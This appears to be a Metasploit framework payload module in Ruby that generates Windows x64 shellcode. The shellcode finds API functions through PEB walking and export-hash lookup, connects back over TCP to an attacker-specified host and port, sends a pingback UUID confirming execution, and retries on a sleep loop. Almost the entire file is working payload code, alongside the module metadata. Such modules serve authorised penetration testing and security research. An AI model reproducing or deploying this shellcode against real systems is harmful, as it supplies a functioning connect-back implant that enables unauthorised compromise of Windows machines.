##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/pingback'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/pingback'

module MetasploitModule

  CachedSize = 460

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x64 Pingback, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and report UUID (Windows x64)',
      'Author'        => [ 'bwatters-r7' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::Pingback
    ))
    def generate_stage
      # 22 -> "0x00,0x16"
      # 4444 -> "0x11,0x5c"
      encoded_port = [datastore['LPORT'].to_i, 2].pack("vn").unpack("N").first
      encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || "127.127.127.127").unpack("V").first
      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
      retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
      pingback_count = datastore['PingbackRetries']
      pingback_sleep = datastore['PingbackSleep']
      self.pingback_uuid ||= generate_pingback_uuid
      uuid_as_db = "0x" + self.pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")

      asm = %Q^
        cld                     ; Clear the direction flag.
        and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
        call start              ; Call start, this pushes the address of 'api_call' onto the stack.

        api_call:
          push r9                  ; Save the 4th parameter
          push r8                  ; Save the 3rd parameter
          push rdx                 ; Save the 2nd parameter
          push rcx                 ; Save the 1st parameter
          push rsi                 ; Save RSI
          xor rdx, rdx             ; Zero rdx
          mov rdx, [gs:rdx+96]     ; Get a pointer to the PEB
          mov rdx, [rdx+24]        ; Get PEB->Ldr
          mov rdx, [rdx+32]        ; Get the first module from the InMemoryOrder module list
        next_mod:                  ;
          mov rsi, [rdx+80]        ; Get pointer to modules name (unicode string)
          movzx rcx, word [rdx+74] ; Set rcx to the length we want to check
          xor r9, r9               ; Clear r9 which will store the hash of the module name
        loop_modname:              ;
          xor rax, rax             ; Clear rax
          lodsb                    ; Read in the next byte of the name
          cmp al, 'a'              ; Some versions of Windows use lower case module names
          jl not_lowercase         ;
          sub al, 0x20             ; If so normalise to uppercase
        not_lowercase:             ;
          ror r9d, 13              ; Rotate right our hash value
          add r9d, eax             ; Add the next byte of the name
          loop loop_modname        ; Loop untill we have read enough
          ; We now have the module hash computed
          push rdx                 ; Save the current position in the module list for later
          push r9                  ; Save the current module hash for later
          ; Proceed to itterate the export address table,
          mov rdx, [rdx+32]        ; Get this modules base address
          mov eax, dword [rdx+60]  ; Get PE header
          add rax, rdx             ; Add the modules base address
          cmp word [rax+24], 0x020B ; is this module actually a PE64 executable?
          ; this test case covers when running on wow64 but in a native x64 context via nativex64.asm and
          ; their may be a PE32 module present in the PEB's module list, (typicaly the main module).
          ; as we are using the win64 PEB ([gs:96]) we wont see the wow64 modules present in the win32 PEB ([fs:48])
          jne get_next_mod1         ; if not, proceed to the next module
          mov eax, dword [rax+136] ; Get export tables RVA
          test rax, rax            ; Test if no export address table is present
          jz get_next_mod1         ; If no EAT present, process the next module
          add rax, rdx             ; Add the modules base address
          push rax                 ; Save the current modules EAT
          mov ecx, dword [rax+24]  ; Get the number of function names
          mov r8d, dword [rax+32]  ; Get the rva of the function names
          add r8, rdx              ; Add the modules base address
          ; Computing the module hash + function hash
        get_next_func:             ;
          jrcxz get_next_mod       ; When we reach the start of the EAT (we search backwards), process the next module
          dec rcx                  ; Decrement the function name counter
          mov esi, dword [r8+rcx*4]; Get rva of next module name
          add rsi, rdx             ; Add the modules base address
          xor r9, r9               ; Clear r9 which will store the hash of the function name
          ; And compare it to the one we want
        loop_funcname:             ;
          xor rax, rax             ; Clear rax
          lodsb                    ; Read in the next byte of the ASCII function name
          ror r9d, 13              ; Rotate right our hash value
          add r9d, eax             ; Add the next byte of the name
          cmp al, ah               ; Compare AL (the next byte from the name) to AH (null)
          jne loop_funcname        ; If we have not reached the null terminator, continue
          add r9, [rsp+8]          ; Add the current module hash to the function hash
          cmp r9d, r10d            ; Compare the hash to the one we are searchnig for
          jnz get_next_func        ; Go compute the next function hash if we have not found it
          ; If found, fix up stack, call the function and then value else compute the next one...
          pop rax                  ; Restore the current modules EAT
          mov r8d, dword [rax+36]  ; Get the ordinal table rva
          add r8, rdx              ; Add the modules base address
          mov cx, [r8+2*rcx]       ; Get the desired functions ordinal
          mov r8d, dword [rax+28]  ; Get the function addresses table rva
          add r8, rdx              ; Add the modules base address
          mov eax, dword [r8+4*rcx]; Get the desired functions RVA
          add rax, rdx             ; Add the modules base address to get the functions actual VA
          ; We now fix up the stack and perform the call to the drsired function...
        finish:
          pop r8                   ; Clear off the current modules hash
          pop r8                   ; Clear off the current position in the module list
          pop rsi                  ; Restore RSI
          pop rcx                  ; Restore the 1st parameter
          pop rdx                  ; Restore the 2nd parameter
          pop r8                   ; Restore the 3rd parameter
          pop r9                   ; Restore the 4th parameter
          pop r10                  ; pop off the return address
          sub rsp, 32              ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                   ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
          push r10                 ; push back the return address
          jmp rax                  ; Jump into the required function
          ; We now automagically return to the correct caller...
        get_next_mod:              ;
          pop rax                  ; Pop off the current (now the previous) modules EAT
        get_next_mod1:             ;
          pop r9                   ; Pop off the current (now the previous) modules hash
          pop rdx                  ; Restore our position in the module list
          mov rdx, [rdx]           ; Get the next module
          jmp next_mod             ; Process this module

        start:
          pop rbp               ; block API pointer

        reverse_tcp:
        ; setup the structures we need on the stack...
          mov r14, 'ws2_32'
          push r14                ; Push the bytes 'ws2_32',0,0 onto the stack.
          mov r14, rsp            ; save pointer to the "ws2_32" string for LoadLibraryA call.
          sub rsp, #{408 + 8}     ; alloc sizeof( struct WSAData ) bytes for the WSAData
                                  ; structure (+8 for alignment)
          mov r13, rsp            ; save pointer to the WSAData structure for WSAStartup call.
          mov r12, #{encoded_host_port}
          push r12                ; host, family AF_INET and port
          mov r12, rsp            ; save pointer to sockaddr struct for connect call

        ; perform the call to LoadLibraryA...
          mov rcx, r14            ; set the param for the library to load
          mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
          call rbp                ; LoadLibraryA( "ws2_32" )

        ; perform the call to WSAStartup...
          mov rdx, r13            ; second param is a pointer to this stuct
          push 0x0101             ;
          pop rcx                 ; set the param for the version requested
          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
          call rbp                ; WSAStartup( 0x0101, &WSAData );

        ; stick the retry count on the stack and store it
          push #{retry_count}     ; retry counter
          pop r14
          push #{pingback_count}
          pop r15

        create_socket:
        ; perform the call to WSASocketA...
          push rax                ; if we succeed, rax wil be zero, push zero for the flags param.
          push rax                ; push null for reserved parameter
          xor r9, r9              ; we do not specify a WSAPROTOCOL_INFO structure
          xor r8, r8              ; we do not specify a protocol
          inc rax                 ;
          mov rdx, rax            ; push SOCK_STREAM
          inc rax                 ;
          mov rcx, rax            ; push AF_INET
          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
          call rbp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
          mov rdi, rax            ; save the socket for later

        try_connect:
        ; perform the call to connect...
          push 16                 ; length of the sockaddr struct
          pop r8                  ; pop off the third param
          mov rdx, r12            ; set second param to pointer to sockaddr struct
          mov rcx, rdi            ; the socket
          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
          call rbp                ; connect( s, &sockaddr, 16 );

          test eax, eax           ; non-zero means failure
          jz connected

        handle_connect_failure:
          dec r14                 ; decrement the retry count
          jnz try_connect
          dec r15
          jmp close_socket

        failure:
          call exitfunk

        ; this  lable is required so that reconnect attempts include
        ; the UUID stuff if required.
        connected:

        send_pingback:
          xor r9, r9              ; flags
          push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
          pop r8
          call get_pingback_address  ; put uuid buffer on the stack
          db #{uuid_as_db}  ; PINGBACK_UUID

        get_pingback_address:
          pop rdx                ; PINGBACK UUID address
          mov rcx, rdi           ; Socket handle
          mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
          call rbp               ; call send

        close_socket:
          mov rcx, rdi           ; Socket handle
          mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
          call rbp               ; call closesocket
        ^
      if pingback_count > 0
        asm << %Q^
          sleep:
            test r15, r15         ; check pingback retry counter
            jz exitfunk           ; bail if we are at 0
            dec r15               ;decrement the pingback retry counter
            push #{(pingback_sleep * 1000)}            ; 10 seconds
            pop rcx               ; set the sleep function parameter
            mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
            call rbp              ; Sleep()
            jmp create_socket     ; repeat callback
        ^
      end
      asm << %Q^
        exitfunk:
          pop rax               ; won't be returning, realign the stack with a pop
          push 0                ;
          pop rcx               ; set the exit function parameter
          mov r10, 0x56a2b5f0
          call rbp              ; ExitProcess(0)
      ^
      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
    end
  end
end
